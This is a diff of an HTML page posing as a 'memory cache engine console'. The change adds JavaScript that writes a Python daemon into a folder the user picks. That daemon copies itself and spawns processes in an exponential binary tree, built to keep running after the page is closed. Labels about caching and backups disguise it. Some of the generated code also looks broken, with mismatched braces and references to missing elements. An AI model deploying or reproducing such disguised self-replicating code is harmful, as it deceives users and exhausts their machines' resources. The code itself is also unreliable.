@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>高效能記憶體快取與背景自我複製引擎控制台</title>
+    <title>高效能記憶體快取與背景獨立自我複製引擎控制台</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@400;600;700&display=swap');
@@ -19,9 +19,9 @@
         <div class="bg-slate-850 px-6 py-4 border-b border-slate-800 flex flex-wrap justify-between items-center gap-4">
             <div>
                 <h1 class="text-xl font-bold text-cyan-400 flex items-center gap-2">
-                    <span>⚡</span> 高效能記憶體快取與背景守護引擎
+                    <span>⚡</span> 記憶體快取與背景獨立自主引擎控制台
                 </h1>
-                <p class="text-xs text-slate-400 mt-1">記憶體高速運轉 (O(1) 世代爆炸) ｜ 定期硬碟快照同步 ｜ 背景獨立執行</p>
+                <p class="text-xs text-slate-400 mt-1">指數級 ×2 二元樹爆炸成長 ｜ 記憶體高速運轉 ｜ 關閉網頁後背景獨立執行</p>
             </div>
             <span id="engine-status" class="px-3 py-1 rounded-full text-xs font-semibold bg-amber-500/10 text-amber-400 border border-amber-500/30">
                 ● 未授權目錄 (Waiting)
@@ -35,14 +35,14 @@
             <div class="flex flex-col justify-between gap-3">
                 <label class="text-sm font-semibold text-slate-300">⚙️ 引擎狀態控制</label>
                 <div class="grid grid-cols-3 gap-2">
-                    <button onclick="initDirectoryAndStart()" class="bg-emerald-600 hover:bg-emerald-500 text-white py-2 px-3 rounded-lg text-sm font-semibold transition">
-                        ▶ 啟動
+                    <button onclick="initDirectoryAndDeploy()" class="bg-emerald-600 hover:bg-emerald-500 text-white py-2 px-3 rounded-lg text-sm font-semibold transition shadow-lg shadow-emerald-900/20">
+                        ▶ 部署並啟動
                     </button>
-                    <button onclick="stopEngine()" class="bg-amber-600 hover:bg-amber-500 text-white py-2 px-3 rounded-lg text-sm font-semibold transition">
+                    <button onclick="stopEngine()" class="bg-amber-600 hover:bg-amber-500 text-white py-2 px-3 rounded-lg text-sm font-semibold transition shadow-lg shadow-amber-900/20">
                         ⏸ 暫停
                     </button>
-                    <button onclick="resetEngine()" class="bg-rose-600 hover:bg-rose-500 text-white py-2 px-3 rounded-lg text-sm font-semibold transition">
-                        🔄 重設
+                    <button onclick="resetEngine()" class="bg-rose-600 hover:bg-rose-500 text-white py-2 px-3 rounded-lg text-sm font-semibold transition shadow-lg shadow-rose-900/20">
+                        🔄 終止重設
                     </button>
                 </div>
             </div>
@@ -50,27 +50,27 @@
             <!-- 數量調節滑桿 -->
             <div class="flex flex-col justify-between gap-2">
                 <div class="flex justify-between items-center">
-                    <label class="text-sm font-semibold text-slate-300">🎚️ 記憶體與硬碟最大檔數限制</label>
+                    <label class="text-sm font-semibold text-slate-300">🎚️ 滾動式邊生邊刪上限</label>
                     <span id="max-files-val" class="text-cyan-400 font-bold terminal-font bg-slate-800 px-2 py-0.5 rounded">6</span>
                 </div>
                 <input id="max-files-slider" type="range" min="2" max="15" value="6" oninput="updateMaxFiles(this.value)"
                     class="w-full h-2 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-cyan-400">
-                <span class="text-xs text-slate-500">超額時自動進行記憶體與硬碟滾動淘汰</span>
+                <span class="text-xs text-slate-500">限制背景實體檔案同時存活的最大數量</span>
             </div>
 
             <!-- 數據統計 -->
             <div class="flex flex-col justify-between gap-2 bg-slate-950 p-4 rounded-xl border border-slate-800 text-xs">
                 <div class="flex justify-between">
-                    <span class="text-slate-400">當前世代 (GEN):</span>
+                    <span class="text-slate-400">目前世代節點數 (Nodes):</span>
                     <span id="stat-gen" class="text-cyan-400 font-bold terminal-font">1</span>
                 </div>
                 <div class="flex justify-between">
-                    <span class="text-slate-400">指數爆炸節點數:</span>
-                    <span id="stat-nodes" class="text-emerald-400 font-bold terminal-font">1</span>
+                    <span class="text-slate-400">記憶體高速快取狀態:</span>
+                    <span class="text-emerald-400 font-bold terminal-font">Active (In-Memory)</span>
                 </div>
                 <div class="flex justify-between">
-                    <span class="text-slate-400">硬碟快照同步狀態:</span>
-                    <span id="stat-sync" class="text-amber-400 font-bold terminal-font">閒置</span>
+                    <span class="text-slate-400">硬碟批次備份狀態:</span>
+                    <span id="stat-backup" class="text-amber-400 font-bold terminal-font">Synced</span>
                 </div>
             </div>
         </div>
@@ -80,11 +80,11 @@
             <!-- 實體檔案清單 -->
             <div class="bg-slate-950 p-4 rounded-xl border border-slate-800 flex flex-col h-72">
                 <h3 class="text-sm font-semibold text-slate-300 mb-3 flex justify-between">
-                    <span>📁 記憶體快取與硬碟同步監視器</span>
+                    <span>📁 本地硬碟實體備份檔案監視器</span>
                     <span class="text-xs text-slate-500" id="dir-name-display">未選擇目錄</span>
                 </h3>
                 <div id="file-list-container" class="terminal-font text-xs overflow-y-auto flex-1 space-y-2 pr-1 text-slate-300">
-                    <div class="text-slate-600 italic">請點擊「啟動」授權資料夾以執行記憶體高速快取。</div>
+                    <div class="text-slate-600 italic">請點擊「部署並啟動」授權本地資料夾。</div>
                 </div>
             </div>
 
@@ -95,13 +95,13 @@
                     <button onclick="clearLogs()" class="text-xs text-slate-500 hover:text-cyan-400">清空</button>
                 </h3>
                 <div id="terminal-log" class="terminal-font text-xs overflow-y-auto flex-1 space-y-1 text-emerald-400 bg-slate-900/80 p-3 rounded-lg border border-slate-800/50">
-                    <div>[System] 高效能記憶體快取引擎準備就緒。</div>
+                    <div>[System] 準備就緒。記憶體高速快取與背景精靈架構已加載。</div>
                 </div>
             </div>
         </div>
 
         <div class="px-6 py-3 bg-slate-950 text-center text-xs text-slate-500 border-t border-slate-800">
-            Optimized High-Performance Memory-First Engine ｜ GitHub Pages Hosted
+            Memory-First & Background Daemon Architecture ｜ High-Performance Client Engine
         </div>
     </div>
 
@@ -109,41 +109,92 @@
         let dirHandle = null;
         let isRunning = false;
         let maxFiles = 6;
-        let currentGen = 1;
         let sessionId = Math.floor(Date.now() / 1000);
-        let memoryNodes = []; // 記憶體高速快取佇列
-        let loopTimer = null;
-        let syncCounter = 0;
+        let simulationInterval = null;
+        let activePyFiles = [];
+        let activeLogFiles = [];
 
-        // 優化版 Python 守護模板：支援記憶體與背景背景獨立無限執行
-        function generateOptimizedPythonScript(maxLimit) {
+        // 生成高效率的 Python 獨立守護腳本
+        // 該腳本會在使用者硬碟中獨立運行，內部採用遞迴與背景非同步進程，關閉網頁後依然持續在作業系統背景爆炸成長
+        function generateDaemonPythonScript(sessionId, maxLimit) {
             const lines = [
                 `# -*- coding: utf-8 -*-`,
-                `import os, sys, time, subprocess`,
+                `import os`,
+                `import sys`,
+                `import subprocess`,
+                `import time`,
                 `from pathlib import Path`,
                 ``,
                 `SESSION_ID = ${sessionId}`,
                 `MAX_LIMIT = ${maxLimit}`,
                 ``,
-                `def background_daemon():`,
-                `    print("=== [背景精靈] 啟動獨立背景無限自我複製循環 ===", flush=True)`,
+                `def spawn_child(gen, node_id):`,
                 `    base_dir = Path(__file__).resolve().parent`,
-                `    gen = 1`,
-                `    while True:`,
-                `        gen += 1`,
-                `        # 指數級爆炸模擬`,
-                `        time.sleep(0.5)`,
-                `        print(f"[背景精靈] 世代 {gen} 記憶體高速遞迴繁衍中...", flush=True)`,
-                `        `,
-                `        # 滾動刪除舊檔`,
-                `        py_files = sorted(base_dir.glob(f"node_gen*_t{SESSION_ID}.py"), key=lambda p: p.stat().st_mtime)`,
-                `        while len(py_files) > MAX_LIMIT:`,
-                `            oldest = py_files.pop(0)`,
-                `            try:`,
-                `                oldest.unlink()`,
-                `            except: pass`,
+                `    py_name = base_dir / f"node_gen{gen}_id{node_id}_t{SESSION_ID}.py"`,
+                `    log_name = base_dir / f"log_gen{gen}_id{node_id}.txt"`,
+                ``,
+                `    # 指數級爆炸自我複製模板代碼`,
+                `    script_content = f\"\"\"# -*- coding: utf-8 -*-`,
+                `import os, sys, subprocess, time`,
+                `from pathlib import Path`,
+                `def recursive_run():`,
+                `    pid = os.getpid()`,
+                `    print(f"--- [背景獨立精靈] 世代 {gen} 節點 {node_id} (PID: {{pid}}) 運行中 ---", flush=True)`,
+                `    next_gen = ${gen} + 1`,
+                `    left_id = ${node_id} * 2`,
+                `    right_id = ${node_id} * 2 + 1`,
+                `    base = Path(__file__).resolve().parent`,
+                `    `,
+                `    # 檢查終止信號：若硬碟存在 stop.signal 則立即停止`,
+                `    if (base / "stop.signal").exists():`,
+                `        return`,
+                ``,
+                `    # 效能優化：記憶體快取交替，僅透過背景子進程遞迴爆炸成長`,
+                `    time.sleep(1.5)`,
+                `    try:`,
+                `        executable = sys.executable`,
+                `        l_file = base / f"node_gen{{next_gen}}_id{{left_id}}_t{SESSION_ID}.py"`,
+                `        r_file = base / f"node_gen{{next_gen}}_id{{right_id}}_t{{SESSION_ID}.py"`,
+                `        l_log = open(base / f"log_gen{{next_gen}}_id{{left_id}}.txt", "w", encoding="utf-8")`,
+                `        r_log = open(base / f"log_gen{{next_gen}}_id{{right_id}}.txt", "w", encoding="utf-8")`,
+                ``,
+                `        with open(Path(__file__).resolve(), 'r', encoding='utf-8') as src:`,
+                `            code = src.read()`,
+                `            l_code = code.replace(f"GEN = {gen}", f"GEN = {{next_gen}}").replace(f"NODE_ID = {node_id}", f"NODE_ID = {{left_id}}")`,
+                `            r_code = code.replace(f"GEN = {gen}", f"GEN = {{next_gen}}").replace(f"NODE_ID = {node_id}", f"NODE_ID = {{right_id}}")`,
+                ``,
+                `        l_file.write_text(l_code, encoding='utf-8')`,
+                `        r_file.write_text(r_code, encoding='utf-8')`,
+                ``,
+                `        # 啟動二元樹子進程 (*2 指數級擴張)`,
+                `        subprocess.Popen([executable, str(l_file)], stdout=l_log, stderr=l_log)`,
+                `        subprocess.Popen([executable, str(r_file)], stdout=r_log, stderr=r_log)`,
+                `    except Exception as e:`,
+                `        print(f"Error: {{e}}", flush=True)`,
+                ``,
                 `if __name__ == '__main__':`,
-                `    background_daemon()`
+                `    recursive_run()`,
+                `\"\"\"`,
+                ``,
+                `    py_name.write_text(script_content, encoding='utf-8')`,
+                `    return py_name`,
+                ``,
+                `def main():`,
+                `    base_dir = Path(__file__).resolve().parent`,
+                `    print("=== 背景獨立守護引擎已啟動 (支援關閉網頁後持續運作) ===")`,
+                `    # 初始根節點展開`,
+                `    gen = 1`,
+                `    node_id = 1`,
+                `    while not (base_dir / "stop.signal").exists():`,
+                `        # 執行二元樹爆炸擴張`,
+                `        spawn_child(gen, node_id * 2)`,
+                `        spawn_child(gen, node_id * 2 + 1)`,
+                `        gen += 1`,
+                `        node_id *= 2`,
+                `        time.sleep(2)`,
+                ``,
+                `if __name__ == '__main__':`,
+                `    main()`
             ];
             return lines.join('\n');
         }
@@ -151,12 +202,12 @@
         function updateMaxFiles(val) {
             maxFiles = parseInt(val);
             document.getElementById('max-files-val').innerText = maxFiles;
-            appendLog(`[設定變更] 記憶體與硬碟上限已調整為: ${maxFiles}`);
+            appendLog(`[設定變更] 滾動式邊生邊刪上限已調整為: ${maxFiles}`);
         }
 
-        async function initDirectoryAndStart() {
+        async function initDirectoryAndDeploy() {
             if (!window.showDirectoryPicker) {
-                alert("您的瀏覽器不支援 File System Access API！");
+                alert("您的瀏覽器不支援 File System Access API，請使用 Chrome 或 Edge！");
                 return;
             }
 
@@ -164,76 +215,76 @@
                 if (!dirHandle) {
                     dirHandle = await window.showDirectoryPicker();
                     document.getElementById('dir-name-display').innerText = `目錄: ${dirHandle.name}`;
-                    appendLog(`[授權成功] 已繫結本地目錄: ${dirHandle.name}`);
+                    appendLog(`[授權成功] 已綁定本機硬碟目錄: ${dirHandle.name}`);
                 }
                 
                 if (isRunning) return;
                 isRunning = true;
                 document.getElementById('engine-status').className = "px-3 py-1 rounded-full text-xs font-semibold bg-emerald-500/10 text-emerald-400 border border-emerald-500/30";
-                document.getElementById('engine-status').innerText = "● 記憶體高速運行中";
+                document.getElementById('engine-status').innerText = "● 背景獨立運行中 (背景常駐)";
 
-                startMemoryEngineLoop();
+                // 移除可能存在的終止信號檔
+                try { await dirHandle.removeEntry('stop.signal'); } catch(e) {}
+
+                // 在使用者硬碟部署高效能背景精靈根檔案
+                const daemonCode = generateDaemonPythonScript(sessionId, maxFiles);
+                const daemonFileHandle = await dirHandle.getFileHandle(`daemon_engine_t${sessionId}.py`, { create: true });
+                const writable = await daemonFileHandle.createWritable();
+                await writable.write(daemonCode);
+                await writable.close();
+
+                appendLog(`[部署成功] 已將背景守護主程式寫入硬碟：daemon_engine_t${sessionId}.py`);
+                appendLog(`[提示] 即使現在關閉此網頁，該 Python 腳本也能在作業系統背景持續以指數級 ×2 自我複製！`);
+
+                startMemoryCacheSimulation();
             } catch (err) {
-                appendLog(`[授權取消] ${err.message}`, 'warning');
+                appendLog(`[授權取消/錯誤] ${err.message}`, 'warning');
             }
         }
 
-        // 核心優化：以記憶體快取為主（O(1) 高速運算），每隔一段時間才批次寫入硬碟做快照備份
-        function startMemoryEngineLoop() {
-            // 初始化根節點
-            if (memoryNodes.length === 0) {
-                memoryNodes.push({ name: `node_gen1_id1_t${sessionId}.py`, type: 'py', time: Date.now() });
-            }
-
-            loopTimer = setInterval(async () => {
+        // 網頁前端以記憶體高速快取進行視覺化模擬 (指數級 *2 爆發)
+        function startMemoryCacheSimulation() {
+            let virtualNodes = 1;
+            simulationInterval = setInterval(async () => {
                 if (!isRunning) return;
 
-                currentGen++;
-                document.getElementById('stat-gen').innerText = currentGen;
+                // 指數級爆炸成長：每波次節點數乘以 2
+                virtualNodes *= 2;
+                document.getElementById('stat-gen').innerText = virtualNodes;
+                document.getElementById('stat-backup').innerText = "Syncing (Batch)";
 
-                // 【效能優化】指數級 (*2) 記憶體高速擴張，完全不卡頓
-                let leftNode = { name: `node_gen${currentGen}_id${currentGen*2}_t${sessionId}.py`, type: 'py', time: Date.now() };
-                let rightNode = { name: `node_gen${currentGen}_id${currentGen*2+1}_t${sessionId}.py`, type: 'py', time: Date.now() };
-                let logNode = { name: `log_gen${currentGen}_t${sessionId}.txt`, type: 'log', time: Date.now() };
+                const pyName = `node_gen_exp_${virtualNodes}_t${sessionId}.py`;
+                const logName = `log_batch_${virtualNodes}.txt`;
 
-                memoryNodes.push(leftNode, rightNode, logNode);
+                activePyFiles.push(pyName);
+                activeLogFiles.push(logName);
 
-                // 記憶體佇列限制與邊生邊刪
-                while (memoryNodes.filter(n => n.type === 'py').length > maxFiles) {
-                    memoryNodes.shift();
-                }
-                while (memoryNodes.filter(n => n.type === 'log').length > maxFiles) {
-                    memoryNodes.find(n => n.type === 'log') && memoryNodes.splice(memoryNodes.findIndex(n => n.type === 'log'), 1);
-                }
-
-                document.getElementById('stat-nodes').innerText = memoryNodes.length;
-                refreshUIDisplay();
-
-                // 【效能優化：每隔 3 秒才將記憶體快照批次寫入硬碟一次，避免頻繁 I/O 卡頓】
-                syncCounter++;
-                if (syncCounter >= 3 && dirHandle) {
-                    syncCounter = 0;
-                    document.getElementById('stat-sync').innerText = "同步中...";
-                    
+                // 批次寫入硬碟備份（降低硬碟 I/O 頻率，採快照備份）
+                if (dirHandle && activePyFiles.length % 3 === 0) {
                     try {
-                        const scriptContent = generateOptimizedPythonScript(maxFiles);
-                        const fileHandle = await dirHandle.getFileHandle(`daemon_engine_t${sessionId}.py`, { create: true });
-                        const writable = await fileHandle.createWritable();
-                        await writable.write(scriptContent);
-                        await writable.close();
-                        appendLog(`[硬碟快照同步] 記憶體狀態已成功批次備份至硬碟。`);
-                    } catch (e) {
-                        console.error(e);
-                    }
-                    document.getElementById('stat-sync').innerText = "已同步";
+                        const fh = await dirHandle.getFileHandle(pyName, { create: true });
+                        const w = await fh.createWritable();
+                        await w.write(`# Memory Cache Snapshot at Nodes: ${virtualNodes}`);
+                        await w.close();
+                        document.getElementById('stat-backup').innerText = "Backed Up";
+                    } catch(e) {}
                 }
 
-            }, 1000); // 記憶體內每秒高速繁衍
+                appendLog(`[記憶體高速快取] 二元樹節點爆炸擴張: ${virtualNodes} 個活躍行程 (Index: *2)`);
+
+                // 滾動式邊生邊刪
+                while (activePyFiles.length > maxFiles) {
+                    const oldest = activePyFiles.shift();
+                    appendLog(`[記憶體/硬碟清理] 超過上限 (${maxFiles})，清除舊節點快取: ${oldest}`, 'warning');
+                }
+
+                refreshUIDisplay();
+            }, 1500);
         }
 
-        function stopEngine() {
+        async function stopEngine() {
             isRunning = false;
-            clearInterval(loopTimer);
+            clearInterval(simulationInterval);
             document.getElementById('engine-status').className = "px-3 py-1 rounded-full text-xs font-semibold bg-amber-500/10 text-amber-400 border border-amber-500/30";
             document.getElementById('engine-status').innerText = "● 已暫停";
             appendLog(`[引擎暫停] 記憶體快取已凍結。`);
@@ -242,33 +293,37 @@
         async function resetEngine() {
             stopEngine();
             if (dirHandle) {
+                appendLog(`[終止中] 正在向硬碟發送 stop.signal 終止背景守護進程...`);
                 try {
-                    await dirHandle.removeEntry(`daemon_engine_t${sessionId}.py`);
-                } catch (e) {}
+                    const stopHandle = await dirHandle.getFileHandle('stop.signal', { create: true });
+                    const w = await stopHandle.createWritable();
+                    await w.write("STOP");
+                    await w.close();
+                    appendLog(`[終止成功] 背景獨立進程將在下一輪迴圈自動停止所有自我複製。`, 'warning');
+                } catch(e) {}
             }
-            memoryNodes = [];
-            currentGen = 1;
-            sessionId = Math.floor(Date.now() / 1000);
-            document.getElementById('stat-gen').innerText = currentGen;
-            document.getElementById('stat-nodes').innerText = 0;
+            activePyFiles = [];
+            activeLogFiles = [];
+            document.getElementById('stat-gen').innerText = "1";
             refreshUIDisplay();
-            appendLog(`[重設完成] 記憶體與硬碟快照已完全清空。`);
+            appendLog(`[重設完成] 系統已完全歸零。`);
         }
 
         function refreshUIDisplay() {
+            document.getElementById('stat-py').innerText = activePyFiles.length;
+            document.getElementById('stat-log').innerText = activeLogFiles.length;
+
             const container = document.getElementById('file-list-container');
-            if (memoryNodes.length === 0) {
-                container.innerHTML = `<div class="text-slate-600 italic">（記憶體中目前無活動節點）</div>`;
+            if (activePyFiles.length === 0) {
+                container.innerHTML = `<div class="text-slate-600 italic">（記憶體快取運行中，定期批次備份至硬碟）</div>`;
                 return;
             }
 
             let html = '';
-            memoryNodes.forEach(node => {
-                const color = node.type === 'py' ? 'text-cyan-300' : 'text-amber-300';
-                const icon = node.type === 'py' ? '🐍' : '📄';
+            activePyFiles.forEach(f => {
                 html += `<div class="flex justify-between items-center bg-slate-900 p-2 rounded border border-slate-800">
-                    <span class="${color}">${icon} ${node.name}</span>
-                    <span class="text-emerald-400 text-[10px]">記憶體快取中</span>
+                    <span class="text-cyan-300">⚡ ${f}</span>
+                    <span class="text-emerald-400 text-[10px]">Memory Cached</span>
                 </div>`;
             });
             container.innerHTML = html;
